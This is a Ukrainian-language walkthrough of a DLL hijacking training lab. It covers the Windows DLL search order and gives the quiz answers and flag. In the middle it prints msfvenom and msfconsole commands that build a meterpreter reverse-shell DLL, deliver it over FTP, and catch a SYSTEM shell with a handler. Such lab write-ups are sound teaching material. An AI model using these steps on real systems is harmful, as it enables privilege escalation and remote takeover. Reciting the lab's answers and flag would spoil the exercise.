Що таке DLL 
Бібліотека динамічних посилань (DLL) є основним компонентом операційної системи Windows. Вони часто пишуться як бібліотека для зберігання коду або функцій, які можуть використовуватися кількома програмами. Якщо зловмисник може контролювати, яку DLL завантажує програма, то зловмисник може вставити шкідливу DLL в процес завантаження DLL. Цей процес відомий як порядок пошуку DLL.

Порядок пошуку DLL 
Коли програма виконується часто чи ні, для її запуску потрібен набір залежностей. Це DLL. Якщо програмі потрібно використовувати частину функціональності, що міститься в DLL, їй спочатку потрібно буде завантажити цю DLL. Перед завантаженням DLL операційна система знайде необхідні DLL, шукаючи набір каталогів у певному порядку. Якщо явний шлях не визначено, Windows використовуватиме такий порядок пошуку, щоб знайти DLL в системі:

    1. Каталог, з якого завантажувалася програма.
    2. Поточний каталог.
    3. Системний каталог. | C:\Windows\System32
    4. 16-розрядний системний каталог | C:\Windows\System
    5. Каталог Windows | C:\Windows
    6. Каталоги, перераховані у змінній середовища PATH.

DLL Hijacking
Якщо DLL відсутня в системі, а зловмисник має доступ на запис до будь-якої теки в наведеному вище порядку пошуку, він може перемістити DLL в теку з іменем відсутньої DLL. Потім це буде завантажено програмою, яка дозволить виконувати код у контексті користувача, який запускає програму (що може бути в контексті СИСТЕМИ). Крім того, якщо DLL дійсно існує в системі, але знаходиться в теці, яка є низькою в порядку пошуку (тобто в каталозі в PATH), і є тека, до якої зловмисник може записати далі в порядку пошуку, тоді замість нього буде завантажено DLL зловмисника.

У цій лабораторії 
У цій лабораторній роботі розробник інсталював спеціальну службу на машині Windows під назвою «Служба налагодження розробника», яка працює як СИСТЕМА і налаштована на запуск під час запуску. Ця служба шукає відсутню DLL під назвою «Debug.dll». Ваше завдання полягає в тому, щоб створити шкідливе DLL-навантаження за допомогою msfvenom, знайти каталог, з якого служба намагається викликати відсутню DLL, захопити процес порядку пошуку, щоб підвищити привілеї та прочитати токен.

Завдання на цю лабораторну:
    1. Знайдіть каталог із доступом до запису, який шукається, коли Windows намагається знайти DLL
    2. Використовуючи msfvenom, створіть корисне навантаження DLL, яке можна додати до каталогу
    3. Отримайте доступ до СИСТЕМИ та прочитайте, що міститься у файлі C:/token.txt

Перше запитання:
Який каталог можна використовувати для захоплення відсутньої DLL?
    - javapath

Для початку ми відкриваємо термінал PowerShell, для того, щоб дізнатись, чи є у нас доступ для запису до вищевказаних директорій. Перевіряємо їх доступність за допомогою наступної команди: (Get-Acl $Path).AccessToString. Тепер коли ми визначили директорію, нам залишається лише вписати відповідь.

Друге запитання:
Який маркер всередині C:\token.txt?
    - g00d3ff0rth3r3saflag

MSFVenom – безплатний інструмент для створення корисного навантаження (шкідливого файлу). Це, як кажуть, двоюрідний брат Metasploit. З його допомогою ви можете створювати різні корисні навантаження, шелл-код та зворотний шелл. 

Reverse TCP (зворотне підключення, зворотний шелл, пейлоад) - схема взаємодії з цільовим комп'ютером. Говорячи простою мовою. Ми створюємо шкідливий файл (корисне навантаження), після запуску якого цільовий комп'ютер намагатиметься підключитися до нашого комп'ютера. Це називається «бекконнект» або в нашому випадку зворотний шелл, тому що «бекконнект» - це поняття розтяжне.

Metasploit – це платформа для тестування на проникнення, з якою ви можете знаходити, експлуатувати та підтверджувати вразливість.

Meterpreter — розширена функціональна начинка (Payload), яка може бути динамічно розширена під час виконання. У нормальних умовах це означає, що це забезпечує Вас основною оболонкою і дозволяє Вам додавати нові особливості до неї в міру необхідності.

FTP (англ. File Transfer Protocol, укр. протокол передавання файлів) — стандартний мережевий протокол прикладного рівня призначений для пересилання файлів між клієнтом та сервером в комп'ютерній мережі.

Для початку ми створюємо payload, це робиться наступним чином: msfvenom -p windows/meterpreter/reverse_tcp lhost=localhost lport=5555 -f exe > /path/Debug.dll
 - -p: тип корисного навантаження;
 - lhost: ip адреса поточної машини; 
 - lport: локальний порт поточної машини;
 - -f: для якого типу потрібно створювати корисне навантаження;

Після чого наша задача полягає в передачі файлу на іншу віртуальну машину. Це можна зробити декількома варіантами, але в нашому випадку я знайшов один для себе, а саме через відкриття локального FTP сервера через msfconsole.

Для початку розгорнемо сервер FTP наступними діями:
```
    msfconsole
    msf > use auxiliary/server/ftp
    msf > set FTPROOT /tmp/ftproot
    msf > set SRVHOST localhost
    msf > set SRVPORT [1022 > 65535]
    msf > exploit
```

Тепер ми переходимо на віндовс машину, після чого переходимо в адресну стрічку браузера, де ми вписуємо:
```
    ftp://srvhost:srvport
```
І просто завантажуємо інтересуючий нас файл, після чого переміщуємо у вище визначену директорію. Далі ми завершаємо сесію msfconsole й відкриваємо нову з використанням експлойта handler:
```
    msfconsole
    msf > use exploit/multi/handler
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(handler) > set lhost localhost
    msf exploit(handler) > set lport localport
    msf exploit(handler) > exploit
```

При правильному виконанні  всіх дій, наступним нашим кроком буде відкриття сервісних служб у віндовс, для того, щоб запустити:  "Служба налагодження розробника", яка підвантажити нашу створену корисне навантаження. Після чого відкриється meterpreter сесія на машині Kali, де ми зможемо прочитати токен за допомогою команди:
```
    more C:\token.txt
```

Третє запитання:
Який 4-й крок у порядку пошуку DLL?
    - 16-розрядний системний каталог

Четверте запитання:
Правда чи неправда. Якщо DLL існує в системі, зловмисник все ще може використати порядок пошуку за допомогою шкідливої ​​DLL?
    - Правда, адже можна використати каталог вищого порядку

П'яте запитання:
Що з наведеного нижче найкраще описує викрадення DLL?
    - Використання недоліків у процесі заміщення файлу в директорії вищого порядку для пошуку DLL